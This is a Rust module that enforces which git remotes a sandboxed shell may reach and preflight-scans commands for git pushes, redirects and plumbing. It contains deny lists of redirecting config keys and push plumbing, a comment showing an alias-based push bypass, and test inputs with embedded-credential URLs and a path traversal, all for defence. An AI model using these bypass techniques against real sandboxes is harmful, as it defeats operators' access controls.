//! Host policy for git access from the generic shell sandbox (WI#816).
//!
//! The grant is the manifest's reserved extension point: a request may ask for
//! the `git-remotes` extension, and only an explicit, per-tenant host policy
//! (`SANDBOX_GIT_REMOTES`) can grant it. The effective decision names the
//! tenant's allowed remotes, never a credential value.
//!
//! Transport rules:
//! - `file` remotes are virtual `/workspace/...` paths that must initially
//!   resolve inside the call's own workspace. They need no egress.
//! - `http`/`https` remotes require `proxy-enforced`. The per-call proxy
//!   restricts egress to selected hosts already on the tenant allowlist.
//!
//! Nothing in this module carries a credential. URLs with embedded userinfo
//! are refused at parse time, the container environment contains only remote
//! URLs and git hardening switches, and the evidence record contains names,
//! transports, hosts and operation classes only.
//!
//! The manifest shell scan is best-effort preflight, not Git authorization:
//! it does not control repository paths or Git operations on allowed hosts.
//! This slice grants no hosted credentials or push capability.

use std::path::{Path, PathBuf};

use serde::{Deserialize, Serialize};

use crate::sandbox::config::SandboxNetworkMode;
use crate::sandbox::error::{Result, SandboxError};
use crate::sandbox::proxy::allowlist::{DomainAllowlist, extract_host};

/// The reserved manifest extension that expresses a git remote grant request.
pub const GIT_REMOTE_EXTENSION: &str = "git-remotes";
/// Stable identifier of the host grant recorded in capability evidence.
pub const GIT_GRANT_ID: &str = "host:sandbox-git-remotes";
/// Capability field used for every git-grant denial.
const GRANT_FIELD: &str = "extensions.git-remotes";
/// Upper bound on configured remotes; keeps manifests and evidence bounded.
pub const MAX_GIT_REMOTES: usize = 32;
const MAX_URL_LEN: usize = 2048;

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum GitOperationClass {
    Read,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum GitTransport {
    File,
    Http,
    Https,
}

impl GitTransport {
    fn is_network(self) -> bool {
        matches!(self, Self::Http | Self::Https)
    }
}

/// One host-authorized remote. `canonical` is the normalized URL used for
/// exact matching; it is host configuration and is never serialized.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct GitRemote {
    pub name: String,
    pub url: String,
    pub transport: GitTransport,
    pub host: Option<String>,
    pub canonical: String,
}

/// Host configuration parsed from `SANDBOX_GIT_REMOTES`.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct GitGrantConfig {
    pub remotes: Vec<GitRemote>,
}

impl GitGrantConfig {
    fn remote_by_name(&self, name: &str) -> Option<&GitRemote> {
        self.remotes.iter().find(|remote| remote.name == name)
    }

    /// Parse `name=url[,name=url...]`. An empty string means "no grant".
    pub fn from_spec(spec: &str) -> std::result::Result<Option<Self>, String> {
        let spec = spec.trim();
        if spec.is_empty() {
            return Ok(None);
        }
        let mut remotes = Vec::new();
        for (index, entry) in spec.split(',').enumerate() {
            let entry = entry.trim();
            if entry.is_empty() {
                continue;
            }
            let (name, url) = entry.split_once('=').ok_or_else(|| {
                format!("SANDBOX_GIT_REMOTES entry {} must be name=url", index + 1)
            })?;
            let name = name.trim();
            let url = url.trim();
            if name.is_empty() || url.is_empty() {
                return Err(format!(
                    "SANDBOX_GIT_REMOTES entry {} must have a non-empty name and URL",
                    index + 1
                ));
            }
            validate_remote_name(name)?;
            if remotes.iter().any(|remote: &GitRemote| remote.name == name) {
                return Err("SANDBOX_GIT_REMOTES names must be unique".into());
            }
            if remotes.len() >= MAX_GIT_REMOTES {
                return Err(format!(
                    "SANDBOX_GIT_REMOTES supports at most {MAX_GIT_REMOTES} remotes"
                ));
            }
            let parsed = parse_remote_url(url)?;
            remotes.push(GitRemote {
                name: name.to_string(),
                url: url.to_string(),
                transport: parsed.transport,
                host: parsed.host,
                canonical: parsed.canonical,
            });
        }
        if remotes.is_empty() {
            return Ok(None);
        }
        Ok(Some(Self { remotes }))
    }
}

/// The authorized grant for one execution. Host-derived; never request-supplied.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct GitGrantAuthorization {
    pub grant: String,
    pub cwd: PathBuf,
    pub remotes: Vec<GitRemote>,
    /// Network modes in which this grant is supported.
    pub egress: Vec<SandboxNetworkMode>,
}

/// Secret-free evidence describing the applied grant.
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
#[serde(deny_unknown_fields)]
pub struct EffectiveGitCapability {
    pub grant: String,
    pub egress: Vec<SandboxNetworkMode>,
    pub remotes: Vec<EffectiveGitRemote>,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
#[serde(deny_unknown_fields)]
pub struct EffectiveGitRemote {
    pub name: String,
    pub transport: GitTransport,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub host: Option<String>,
    pub operations: Vec<GitOperationClass>,
}

impl GitGrantAuthorization {
    /// Project the tenant ACL onto the exact hosts selected for this call.
    /// Never enable a domain just because it occurs in a configured remote.
    pub(super) fn proxy_hosts(&self, base_allowlist: &[String]) -> Result<Vec<String>> {
        let allowlist = DomainAllowlist::new(base_allowlist);
        let mut hosts = Vec::new();
        for host in self
            .remotes
            .iter()
            .filter_map(|remote| remote.host.as_ref())
        {
            if !allowlist.is_allowed(host).is_allowed() {
                return Err(denied(
                    "selected git remote host is outside the sandbox egress allowlist",
                ));
            }
            if !hosts.contains(host) {
                hosts.push(host.clone());
            }
        }
        Ok(hosts)
    }

    pub fn evidence(&self) -> EffectiveGitCapability {
        EffectiveGitCapability {
            grant: self.grant.clone(),
            egress: self.egress.clone(),
            remotes: self
                .remotes
                .iter()
                .map(|remote| EffectiveGitRemote {
                    name: remote.name.clone(),
                    transport: remote.transport,
                    host: remote.host.clone(),
                    operations: vec![GitOperationClass::Read],
                })
                .collect(),
        }
    }

    /// Git configuration passed to the container through `GIT_CONFIG_*` env
    /// entries. Values are granted remote URLs and hardening switches only;
    /// no credential, token, key or credential-helper command is included.
    pub fn container_env(&self) -> Vec<(String, String)> {
        let mut env = vec![
            ("GIT_TERMINAL_PROMPT".to_string(), "0".to_string()),
            ("GIT_CONFIG_NOSYSTEM".to_string(), "1".to_string()),
            ("GIT_CONFIG_GLOBAL".to_string(), "/dev/null".to_string()),
        ];
        let mut index = 0usize;
        for remote in &self.remotes {
            env.push((
                format!("GIT_CONFIG_KEY_{index}"),
                format!("remote.{}.url", remote.name),
            ));
            env.push((format!("GIT_CONFIG_VALUE_{index}"), remote.url.clone()));
            index += 1;
        }
        // An empty helper resets any helper inherited from the image config,
        // so a credential prompt cannot block the command and no image-level
        // helper can supply a credential the host did not grant.
        env.push((
            format!("GIT_CONFIG_KEY_{index}"),
            "credential.helper".to_string(),
        ));
        env.push((format!("GIT_CONFIG_VALUE_{index}"), String::new()));
        env.push(("GIT_CONFIG_COUNT".to_string(), (index + 1).to_string()));
        env
    }

    fn remote_by_name(&self, name: &str) -> Option<&GitRemote> {
        self.remotes.iter().find(|remote| remote.name == name)
    }
}

/// Authorize the request against host policy and the call's workspace.
///
/// `requested` names remotes to narrow the grant; an empty list means every
/// host-granted remote. A requested name outside the host list, a network
/// remote under an egress mode that cannot carry it, or a `file` remote that
/// resolves outside the workspace is a `capability_denied`.
pub fn authorize_grant(
    host: &GitGrantConfig,
    requested: &[String],
    cwd: &Path,
    network: SandboxNetworkMode,
) -> Result<GitGrantAuthorization> {
    if host.remotes.is_empty() {
        return Err(denied(
            "no host git grant is configured for this tenant; \
             SANDBOX_GIT_REMOTES is empty or unset",
        ));
    }
    let selected: Vec<GitRemote> = if requested.is_empty() {
        host.remotes.clone()
    } else {
        let mut selected = Vec::new();
        for name in requested {
            let remote = host.remote_by_name(name).ok_or_else(|| {
                denied(format!(
                    "remote '{name}' is not in this tenant's host git grant"
                ))
            })?;
            if !selected
                .iter()
                .any(|chosen: &GitRemote| chosen.name == remote.name)
            {
                selected.push(remote.clone());
            }
        }
        selected
    };
    let needs_proxy = selected.iter().any(|remote| remote.transport.is_network());
    if network == SandboxNetworkMode::Proxy {
        return Err(denied(
            "git-remotes is not supported in advisory proxy mode",
        ));
    }
    if needs_proxy && network != SandboxNetworkMode::ProxyEnforced {
        return Err(denied(
            "HTTP(S) git remotes require network.mode=proxy-enforced",
        ));
    }
    for remote in &selected {
        if remote.transport == GitTransport::File {
            validate_file_remote(remote, cwd)?;
        }
    }
    let egress = if needs_proxy {
        vec![SandboxNetworkMode::ProxyEnforced]
    } else {
        vec![
            SandboxNetworkMode::ProxyEnforced,
            SandboxNetworkMode::Tunnel,
            SandboxNetworkMode::None,
        ]
    };
    Ok(GitGrantAuthorization {
        grant: GIT_GRANT_ID.to_string(),
        cwd: cwd.to_path_buf(),
        remotes: selected,
        egress,
    })
}

/// A `file` remote is a virtual `/workspace/...` URL. Resolve it against the
/// canonical workspace and require the real path to stay inside it.
fn validate_file_remote(remote: &GitRemote, cwd: &Path) -> Result<()> {
    let relative = remote
        .canonical
        .strip_prefix("file:///workspace/")
        .ok_or_else(|| {
            denied(format!(
                "remote '{}' is not a virtual /workspace path",
                remote.name
            ))
        })?;
    let joined = cwd.join(relative);
    let canonical = joined.canonicalize().map_err(|error| {
        denied(format!(
            "file remote '{}' at {} is not readable: {error}",
            remote.name,
            joined.display()
        ))
    })?;
    if !canonical.starts_with(cwd) {
        return Err(denied(format!(
            "file remote '{}' resolves outside the call workspace",
            remote.name
        )));
    }
    if !canonical.is_dir() {
        return Err(denied(format!(
            "file remote '{}' is not a directory",
            remote.name
        )));
    }
    Ok(())
}

/// Check recognizable Git invocations before running a declared manifest.
/// This scan cannot mediate commands constructed at runtime or repository
/// configuration. Egress isolation is independent of the scan.
pub(super) fn authorize_shell_command(
    command: &str,
    grant: Option<&GitGrantAuthorization>,
    network: SandboxNetworkMode,
) -> Result<()> {
    let preflight = Preflight {
        grant,
        offline: network == SandboxNetworkMode::None,
    };
    for simple in tokenize_simple_commands(command) {
        scan_simple_command(&simple, preflight, 0)?;
    }
    Ok(())
}

fn denied(reason: impl Into<String>) -> SandboxError {
    SandboxError::CapabilityDenied {
        field: GRANT_FIELD.to_string(),
        reason: format!(
            "sandbox capability manifest version 1: {GRANT_FIELD}: {}",
            reason.into()
        ),
    }
}

fn validate_remote_name(name: &str) -> std::result::Result<(), String> {
    let valid = !name.is_empty()
        && name.len() <= 128
        && name.bytes().all(|byte| {
            byte.is_ascii_lowercase() || byte.is_ascii_digit() || matches!(byte, b'_' | b'-' | b'.')
        });
    if valid {
        Ok(())
    } else {
        Err(
            "SANDBOX_GIT_REMOTES remote names must be 1-128 lowercase ASCII letters, \
             digits, '.', '_' or '-'"
                .into(),
        )
    }
}

struct ParsedRemoteUrl {
    transport: GitTransport,
    host: Option<String>,
    canonical: String,
}

/// Parse a remote URL from host policy. Credentials must never be embedded,
/// and only the transports this grant can actually mediate are accepted.
fn parse_remote_url(raw: &str) -> std::result::Result<ParsedRemoteUrl, String> {
    let raw = raw.trim();
    if raw.is_empty() || raw.len() > MAX_URL_LEN {
        return Err("SANDBOX_GIT_REMOTES URLs must be 1-2048 bytes".to_string());
    }
    if raw.chars().any(|c| c.is_control() || c.is_whitespace()) {
        return Err(
            "SANDBOX_GIT_REMOTES URLs must not contain whitespace or control bytes".to_string(),
        );
    }
    if raw.contains('@') {
        return Err("SANDBOX_GIT_REMOTES URLs must not embed credentials or userinfo".into());
    }
    let (scheme, rest) = raw
        .split_once("://")
        .ok_or("SANDBOX_GIT_REMOTES requires absolute remote URLs")?;
    let scheme = scheme.to_ascii_lowercase();
    if rest.contains('?') || rest.contains('#') {
        return Err("SANDBOX_GIT_REMOTES URLs must not carry a query or fragment".into());
    }
    match scheme.as_str() {
        "https" | "http" => {
            let (authority, path) = rest.split_once('/').unwrap_or((rest, ""));
            if authority.is_empty() || raw.contains('\\') {
                return Err("SANDBOX_GIT_REMOTES contains an invalid HTTP(S) URL".into());
            }
            let host = extract_host(raw)
                .filter(|host| !host.contains('*'))
                .ok_or("SANDBOX_GIT_REMOTES requires a valid, literal HTTP(S) host")?;
            let transport = if scheme == "https" {
                GitTransport::Https
            } else {
                GitTransport::Http
            };
            Ok(ParsedRemoteUrl {
                transport,
                host: Some(host),
                canonical: format!("{scheme}://{}/{path}", authority.to_ascii_lowercase()),
            })
        }
        "file" => {
            let relative = rest
                .strip_prefix("/workspace/")
                .ok_or("SANDBOX_GIT_REMOTES file URLs must be under the virtual /workspace path")?;
            if relative.contains(['%', '\\']) {
                return Err(
                    "SANDBOX_GIT_REMOTES file URLs must use literal workspace paths".into(),
                );
            }
            validate_virtual_relative_path(relative)?;
            Ok(ParsedRemoteUrl {
                transport: GitTransport::File,
                host: None,
                canonical: format!("file:///workspace/{relative}"),
            })
        }
        _ => Err("SANDBOX_GIT_REMOTES supports only https, http, or file URLs".into()),
    }
}

fn validate_virtual_relative_path(relative: &str) -> std::result::Result<(), String> {
    if relative.is_empty() {
        return Err("SANDBOX_GIT_REMOTES file URL must name a path under /workspace".to_string());
    }
    for component in relative.split('/') {
        if component.is_empty() || component == "." || component == ".." {
            return Err(
                "SANDBOX_GIT_REMOTES file paths must not contain empty, '.' or '..' components"
                    .into(),
            );
        }
    }
    Ok(())
}

// ---------------------------------------------------------------------------
// Shell command scanning
// ---------------------------------------------------------------------------

#[derive(Debug, Clone)]
struct Word {
    text: String,
    dynamic: bool,
}

#[derive(Clone, Copy)]
struct Preflight<'a> {
    grant: Option<&'a GitGrantAuthorization>,
    offline: bool,
}

impl Preflight<'_> {
    fn allows_local_read(self) -> bool {
        self.grant.is_none() && self.offline
    }

    fn read_remote(self, word: &Word) -> Result<()> {
        if self.allows_local_read() && !word.dynamic && is_explicit_local_path(&word.text) {
            return Ok(());
        }
        authorize_url_or_name(word, self.grant)
    }
}

fn is_explicit_local_path(raw: &str) -> bool {
    raw == "."
        || ["./", "/workspace/", "file:///workspace/"]
            .iter()
            .any(|prefix| {
                raw.strip_prefix(prefix).is_some_and(|path| {
                    !path.contains(':') && validate_virtual_relative_path(path).is_ok()
                })
            })
}

/// Split a shell command into simple commands. Quote-aware; command
/// separators end a command. Dynamic expansions are flagged, not evaluated.
fn tokenize_simple_commands(input: &str) -> Vec<Vec<Word>> {
    let mut commands = Vec::new();
    let mut words = Vec::new();
    let mut current = String::new();
    let mut dynamic = false;
    let mut started = false;
    let mut quote: Option<char> = None;
    let mut chars = input.chars();

    let finish_word =
        |words: &mut Vec<Word>, current: &mut String, dynamic: &mut bool, started: &mut bool| {
            if *started {
                words.push(Word {
                    text: std::mem::take(current),
                    dynamic: *dynamic,
                });
                *dynamic = false;
                *started = false;
            }
        };
    let finish_command = |commands: &mut Vec<Vec<Word>>, words: &mut Vec<Word>| {
        if !words.is_empty() {
            commands.push(std::mem::take(words));
        }
    };

    while let Some(c) = chars.next() {
        match quote {
            Some('\'') => {
                started = true;
                if c == '\'' {
                    quote = None;
                } else {
                    current.push(c);
                }
            }
            Some('"') => {
                started = true;
                match c {
                    '"' => quote = None,
                    '\\' => {
                        if let Some(next) = chars.next() {
                            current.push(next);
                        }
                    }
                    '$' | '`' => {
                        dynamic = true;
                        current.push(c);
                    }
                    _ => current.push(c),
                }
            }
            Some(_) => unreachable!("quote state is ' or \""),
            None => match c {
                '\'' | '"' => {
                    quote = Some(c);
                    started = true;
                }
                '\\' => {
                    started = true;
                    if let Some(next) = chars.next() {
                        current.push(next);
                    }
                }
                ';' | '\n' | '|' | '&' | '(' | ')' => {
                    finish_word(&mut words, &mut current, &mut dynamic, &mut started);
                    finish_command(&mut commands, &mut words);
                }
                ' ' | '\t' | '\r' => {
                    finish_word(&mut words, &mut current, &mut dynamic, &mut started);
                }
                '$' | '`' => {
                    dynamic = true;
                    current.push(c);
                    started = true;
                }
                _ => {
                    current.push(c);
                    started = true;
                }
            },
        }
    }
    finish_word(&mut words, &mut current, &mut dynamic, &mut started);
    finish_command(&mut commands, &mut words);
    commands
}

fn is_assignment(word: &str) -> bool {
    let Some((name, _)) = word.split_once('=') else {
        return false;
    };
    !name.is_empty()
        && name.bytes().enumerate().all(|(index, byte)| {
            if index == 0 {
                byte.is_ascii_alphabetic() || byte == b'_'
            } else {
                byte.is_ascii_alphanumeric() || byte == b'_'
            }
        })
}

fn basename(word: &str) -> &str {
    word.rsplit('/').next().unwrap_or(word)
}

fn scan_simple_command(words: &[Word], preflight: Preflight<'_>, depth: usize) -> Result<()> {
    if depth > 4 {
        return Err(denied(
            "nested shell command is too deep to authorize statically",
        ));
    }
    let mut index = 0;
    while index < words.len() && is_assignment(&words[index].text) {
        index += 1;
    }
    while index < words.len() {
        let command = basename(&words[index].text).to_string();
        match command.as_str() {
            "env" => {
                index += 1;
                while index < words.len()
                    && (words[index].text.starts_with('-') || is_assignment(&words[index].text))
                {
                    index += 1;
                }
            }
            "command" | "exec" | "nohup" | "time" => {
                index += 1;
                while index < words.len() && words[index].text.starts_with('-') {
                    index += 1;
                }
            }
            "timeout" if index + 1 < words.len() => {
                index += 2;
            }
            "nice" => {
                index += 1;
                while index < words.len() && words[index].text.starts_with('-') {
                    index += 1;
                }
            }
            "sudo" => {
                index += 1;
                index = skip_sudo_options(words, index);
            }
            "sh" | "bash" | "dash" | "zsh" | "ash" | "ksh" => {
                return scan_shell_c(words, index, preflight, depth);
            }
            "git" => return inspect_git_command(&words[index..], preflight),
            // Git's plumbing executables are not subcommands, so they bypass
            // `inspect_git_command` entirely when invoked by path. They take
            // the same unscreened remote destinations.
            name if is_git_plumbing_executable(name) => {
                return Err(denied(format!(
                    "{name} is not supported by manifest Git preflight"
                )));
            }
            _ => return Ok(()),
        }
    }
    Ok(())
}

fn skip_sudo_options(words: &[Word], mut index: usize) -> usize {
    while index < words.len() {
        let word = &words[index].text;
        if word == "--" {
            return index + 1;
        }
        if !word.starts_with('-') {
            return index;
        }
        let takes_value = matches!(
            word.as_str(),
            "-u" | "--user"
                | "-g"
                | "--group"
                | "-p"
                | "--prompt"
                | "-C"
                | "--close-from"
                | "-h"
                | "--host"
                | "-r"
                | "--role"
                | "-t"
                | "--type"
                | "-U"
                | "--other-user"
        );
        index += if takes_value { 2 } else { 1 };
    }
    index
}

fn scan_shell_c(
    words: &[Word],
    index: usize,
    preflight: Preflight<'_>,
    depth: usize,
) -> Result<()> {
    let mut cursor = index + 1;
    while cursor < words.len() {
        let word = &words[cursor].text;
        if word == "-c" || (word.starts_with('-') && !word.starts_with("--") && word.contains('c'))
        {
            let Some(script) = words.get(cursor + 1) else {
                return Ok(());
            };
            if script.dynamic {
                return Err(denied(
                    "dynamic shell script text cannot be authorized for git network access",
                ));
            }
            for simple in tokenize_simple_commands(&script.text) {
                scan_simple_command(&simple, preflight, depth + 1)?;
            }
            return Ok(());
        }
        if !word.starts_with('-') {
            return Ok(());
        }
        cursor += 1;
    }
    Ok(())
}

/// Configuration keys that could redirect a granted remote alias, log in, or
/// rewrite a granted URL. A command-line override of one of these would make
/// the alias/URL check describe a different destination than git contacts.
///
/// `alias.` and `include.`/`includeIf.` belong here for the same reason at the
/// verb level: an alias renames the subcommand the scan sees, and an include
/// pulls in whatever the included file defines. Verified with real git —
/// `git -c alias.q=push q <url> HEAD:refs/heads/x` pushes, and so does the
/// alias `z = push` loaded through `-c include.path=<file>`.
const REDIRECTING_CONFIG_KEYS: &[&str] = &[
    "remote.",
    "url.",
    "credential.",
    "http.extraheader",
    "alias.",
    "include.",
    "includeif.",
];

/// `-c`, `-cNAME=VALUE`, `--config NAME=VALUE`, `--config=NAME=VALUE`,
/// `--config-env NAME=ENVVAR`, and the `=` spellings. The host pins granted
/// aliases through `GIT_CONFIG_*`; an in-command override of the same key
/// would otherwise win.
fn config_overrides(words: &[Word], index: usize) -> Vec<String> {
    let word = &words[index].text;
    if word == "-c" || word == "--config" || word == "--config-env" {
        return words
            .get(index + 1)
            .map(|w| vec![w.text.clone()])
            .unwrap_or_default();
    }
    if let Some(value) = word
        .strip_prefix("--config=")
        .or_else(|| word.strip_prefix("--config-env="))
    {
        return vec![value.to_string()];
    }
    match word.strip_prefix("-c") {
        Some(value) if !word.starts_with("--") && !value.is_empty() => vec![value.to_string()],
        _ => Vec::new(),
    }
}

fn refuse_redirecting_config(overrides: &[String]) -> Result<()> {
    for override_value in overrides {
        let key = override_value
            .split_once('=')
            .map(|(key, _)| key)
            .unwrap_or(override_value)
            .trim()
            .to_ascii_lowercase();
        if REDIRECTING_CONFIG_KEYS
            .iter()
            .any(|prefix| key == **prefix || key.starts_with(prefix))
        {
            return Err(denied(
                "git configuration overrides that can redirect a granted remote are not permitted",
            ));
        }
    }
    Ok(())
}

/// Find the git subcommand, skipping global options that take a value.
fn git_subcommand(words: &[Word]) -> std::result::Result<Option<usize>, SandboxError> {
    let mut index = 1;
    while index < words.len() {
        let word = &words[index].text;
        if word == "--" {
            return Ok(None);
        }
        if !word.starts_with('-') {
            return Ok(Some(index));
        }
        refuse_redirecting_config(&config_overrides(words, index))?;
        let takes_value = matches!(
            word.as_str(),
            "-C" | "-c"
                | "--git-dir"
                | "--work-tree"
                | "--namespace"
                | "--exec-path"
                | "--config-env"
        );
        if words[index].dynamic && takes_value {
            return Err(denied(
                "dynamic git global option value cannot be authorized",
            ));
        }
        index += if takes_value { 2 } else { 1 };
    }
    Ok(None)
}

fn inspect_git_command(words: &[Word], preflight: Preflight<'_>) -> Result<()> {
    let Some(sub_index) = git_subcommand(words)? else {
        return Ok(());
    };
    let sub = &words[sub_index];
    if sub.dynamic {
        return Err(denied("dynamic git subcommand cannot be authorized"));
    }
    let args = &words[sub_index + 1..];
    match sub.text.as_str() {
        "clone" => authorize_clone(args, preflight),
        "fetch" | "pull" => authorize_fetch(args, preflight),
        // Even a plain push can use config-selected destinations and refspecs.
        // Do not try to authorize writes from an untrusted shell's text.
        "push" => Err(denied(
            "git push is not supported by manifest Git preflight",
        )),
        "ls-remote" => {
            let positional = read_positionals(
                args,
                &[
                    "-q",
                    "--quiet",
                    "--heads",
                    "--branches",
                    "--tags",
                    "--refs",
                    "--exit-code",
                    "--symref",
                ],
                &["--sort"],
            )?;
            let Some(remote) = positional.first() else {
                return if preflight.allows_local_read() {
                    Ok(())
                } else {
                    Err(denied("name an explicit granted remote for ls-remote"))
                };
            };
            preflight.read_remote(remote)
        }
        "remote" => authorize_remote_subcommand(args, preflight),
        "archive" => authorize_archive(args, preflight),
        "submodule" => authorize_submodule(args, preflight),
        // Porcelain `push` is not the only path to a remote. The plumbing
        // verbs speak the transport protocol directly, take their own
        // destination argument, and are not authorized above, so they must
        // not inherit the catch-all.
        verb if is_remote_transport_plumbing(verb) => Err(denied(format!(
            "git {verb} is not supported by manifest Git preflight"
        ))),
        _ => Ok(()),
    }
}

/// Git's remote transport plumbing. `send-pack`/`http-push` write to the
/// remote, `fetch-pack`/`http-fetch` read arbitrary objects, and the
/// `remote-*` helpers are the transport binaries Git itself drives. All of
/// them take a remote destination that this preflight does not authorize, so
/// they cannot inherit the catch-all arm.
fn is_remote_transport_plumbing(verb: &str) -> bool {
    matches!(
        verb,
        "send-pack" | "fetch-pack" | "http-push" | "http-fetch"
    ) || verb.starts_with("remote-")
}

/// The same plumbing, invoked as a standalone executable by path (usually
/// `/usr/lib/git-core/git-send-pack`) rather than as a `git` subcommand.
fn is_git_plumbing_executable(name: &str) -> bool {
    name.strip_prefix("git-")
        .is_some_and(is_remote_transport_plumbing)
}

fn authorize_clone(args: &[Word], preflight: Preflight<'_>) -> Result<()> {
    // Only options that leave the literal clone source visible here. In
    // particular, clone's configuration options are not global Git options.
    let positional = read_positionals(
        args,
        &[
            "-q",
            "--quiet",
            "-v",
            "--verbose",
            "-n",
            "--no-checkout",
            "--bare",
            "--no-hardlinks",
            "--local",
            "--no-local",
            "--single-branch",
            "--no-single-branch",
            "--no-tags",
            "--progress",
            "--no-progress",
        ],
        &[
            "-b",
            "--branch",
            "--depth",
            "-o",
            "--origin",
            "--filter",
            "--shallow-since",
            "--shallow-exclude",
        ],
    )?;
    let Some(remote) = positional.first() else {
        return Ok(());
    };
    preflight.read_remote(remote)
}

fn authorize_fetch(args: &[Word], preflight: Preflight<'_>) -> Result<()> {
    let positional = read_positionals(
        args,
        &[
            "-q",
            "--quiet",
            "-v",
            "--verbose",
            "--ff",
            "--ff-only",
            "--no-rebase",
            "--rebase",
            "--no-tags",
            "--tags",
            "--progress",
            "--no-progress",
            "--prune",
            "--unshallow",
            "--no-recurse-submodules",
        ],
        &[
            "--depth", "--deepen", "-j", "--jobs", "--refmap", "--filter",
        ],
    )?;
    match positional.first() {
        Some(remote) => preflight.read_remote(remote),
        // Only a network-disabled call can safely leave the choice of a
        // local fetch/pull source to Git without a grant.
        None if preflight.allows_local_read() => Ok(()),
        None => Err(denied("name an explicit granted remote for fetch or pull")),
    }
}

fn authorize_remote_subcommand(args: &[Word], preflight: Preflight<'_>) -> Result<()> {
    let Some(action) = args.first() else {
        return Ok(());
    };
    match action.text.as_str() {
        "add" | "set-url" => {
            let positional: Vec<&Word> = args[1..]
                .iter()
                .filter(|word| !word.text.starts_with('-'))
                .collect();
            let Some(url) = positional.get(1) else {
                return Ok(());
            };
            preflight.read_remote(url)
        }
        "update" => Err(denied(
            "git remote update reaches every configured remote; fetch a granted remote by name",
        )),
        _ => Ok(()),
    }
}

fn authorize_archive(args: &[Word], preflight: Preflight<'_>) -> Result<()> {
    let Some(flag) = args
        .iter()
        .position(|word| word.text == "--remote" || word.text.starts_with("--remote="))
    else {
        return Ok(());
    };
    if let Some(value) = args[flag].text.strip_prefix("--remote=") {
        return preflight.read_remote(&Word {
            text: value.into(),
            dynamic: args[flag].dynamic,
        });
    }
    match args.get(flag + 1) {
        Some(remote) => preflight.read_remote(remote),
        None => Err(denied("archive --remote needs a granted remote value")),
    }
}

fn authorize_submodule(args: &[Word], preflight: Preflight<'_>) -> Result<()> {
    if args.first().is_none_or(|word| word.text != "add") {
        return Ok(());
    }
    let positional: Vec<&Word> = args[1..]
        .iter()
        .filter(|word| !word.text.starts_with('-'))
        .collect();
    let Some(url) = positional.first() else {
        return Ok(());
    };
    preflight.read_remote(url)
}

/// Accept only known read options; do not guess the arity of an abbreviation,
/// bundle, or unsupported option and then check the wrong argument as remote.
fn read_positionals<'a>(
    words: &'a [Word],
    flags: &[&str],
    value_options: &[&str],
) -> Result<Vec<&'a Word>> {
    let mut result = Vec::new();
    let mut index = 0;
    let mut end_of_options = false;
    while index < words.len() {
        let arg = &words[index];
        let word = arg.text.as_str();
        if arg.dynamic {
            return Err(denied(
                "dynamic arguments cannot be authorized for this Git read",
            ));
        }
        if !end_of_options && word == "--" {
            end_of_options = true;
            index += 1;
            continue;
        }
        if !end_of_options && word.starts_with('-') && word != "-" {
            if flags.contains(&word) {
                index += 1;
            } else if value_options.contains(&word) {
                if words
                    .get(index + 1)
                    .is_none_or(|value| value.dynamic || value.text.starts_with('-'))
                {
                    return Err(denied("Git read option requires a literal value"));
                }
                index += 2;
            } else if word.starts_with("--")
                && word
                    .split_once('=')
                    .is_some_and(|(key, value)| value_options.contains(&key) && !value.is_empty())
            {
                index += 1;
            } else {
                return Err(denied(
                    "unsupported option in manifest Git read; use full supported options",
                ));
            }
            continue;
        }
        result.push(&words[index]);
        index += 1;
    }
    Ok(result)
}

fn authorize_url_or_name(word: &Word, grant: Option<&GitGrantAuthorization>) -> Result<()> {
    let Some(grant) = grant else {
        return Err(no_grant_denial());
    };
    if word.dynamic {
        return Err(denied(
            "dynamic git remote argument cannot be authorized; name a granted remote or URL literally",
        ));
    }
    if grant.remote_by_name(&word.text).is_some() {
        return Ok(());
    }
    let canonical = canonicalize_command_url(&word.text)?;
    if grant
        .remotes
        .iter()
        .any(|remote| remote.canonical == canonical)
    {
        Ok(())
    } else {
        Err(denied("git remote is not in this tenant's host git grant"))
    }
}

fn canonicalize_command_url(raw: &str) -> Result<String> {
    if let Ok(parsed) = parse_remote_url(raw) {
        return Ok(parsed.canonical);
    }
    // A bare absolute /workspace path is the in-container spelling of a
    // granted `file:///workspace/...` remote.
    let relative = raw
        .strip_prefix("/workspace/")
        .ok_or_else(|| denied("git remote must be a granted name or an absolute URL"))?;
    validate_virtual_relative_path(relative).map_err(denied)?;
    Ok(format!("file:///workspace/{relative}"))
}

fn no_grant_denial() -> SandboxError {
    denied(
        "no host git grant applies to this call; request extensions=[\"git-remotes\"] and \
         have the tenant operator configure SANDBOX_GIT_REMOTES",
    )
}

#[cfg(test)]
mod tests {
    use super::*;

    fn spec() -> GitGrantConfig {
        GitGrantConfig::from_spec(
            "origin=file:///workspace/remotes/origin.git,\
             upstream=https://Git.Example.test/org/repo.git,\
             legacy=http://git.internal/org/repo.git",
        )
        .unwrap()
        .unwrap()
    }

    fn workspace_with_remote() -> (tempfile::TempDir, GitGrantAuthorization) {
        let temp = tempfile::tempdir().unwrap();
        let remote = temp.path().join("remotes/origin.git");
        std::fs::create_dir_all(&remote).unwrap();
        let cwd = temp.path().canonicalize().unwrap();
        let host = GitGrantConfig::from_spec("origin=file:///workspace/remotes/origin.git")
            .unwrap()
            .unwrap();
        let grant = authorize_grant(&host, &[], &cwd, SandboxNetworkMode::ProxyEnforced).unwrap();
        (temp, grant)
    }

    #[test]
    fn config_accepts_named_remotes_and_rejects_embedded_credentials() {
        let parsed = spec();
        assert_eq!(parsed.remotes.len(), 3);
        assert_eq!(parsed.remotes[0].name, "origin");
        assert_eq!(parsed.remotes[1].host.as_deref(), Some("git.example.test"));
        assert_eq!(parsed.remotes[2].transport, GitTransport::Http);
        for bad in [
            "origin=https://user:token@git.example.test/repo.git",
            "origin=git@git.example.test:org/repo.git",
            "origin=https://git.example.test/repo.git?token=1",
            "origin=/srv/git/repo.git",
            "origin=file:///srv/git/repo.git",
            "origin=file:///workspace/../etc/repo.git",
            "Origin=https://git.example.test/repo.git",
            "origin=https://git.example.test/repo.git,origin=https://git.example.test/other.git",
